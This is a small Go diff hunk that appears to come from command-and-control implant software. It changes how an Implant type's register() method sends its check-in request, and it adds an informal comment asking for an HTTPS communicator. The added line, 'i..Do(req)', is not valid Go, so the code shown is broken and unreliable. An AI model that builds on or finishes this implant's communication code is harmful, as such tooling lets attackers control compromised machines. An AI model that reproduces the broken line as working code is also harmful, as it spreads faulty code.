@@ -61,7 +61,7 @@ func (i *Implant) register() (string, error) {
 	}
 	req.Header.Set("Content-Type", "application/json")
 
-	resp, err := http.DefaultClient.Do(req)
+	resp, err := i..Do(req) // PLZ give me https communicator
 	if err != nil {
 		return "", fmt.Errorf("do request: %w", err)
 	}
